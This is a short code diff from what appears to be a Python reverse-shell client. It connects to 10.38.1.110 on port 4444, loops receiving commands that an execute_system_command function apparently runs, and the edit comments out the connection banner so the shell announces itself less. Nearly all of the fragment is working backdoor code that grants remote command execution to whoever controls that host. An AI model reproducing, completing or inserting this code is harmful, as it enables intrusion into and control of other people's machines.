@@ -7,7 +7,7 @@ def execute_system_command(command):
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(('10.38.1.110', 4444))
 
-connection.send("\n[+] Connection Established.\n".encode())
+# connection.send("\n[+] Connection Established.\n".encode())
 
 while True:
     command = connection.recv(1024).decode()
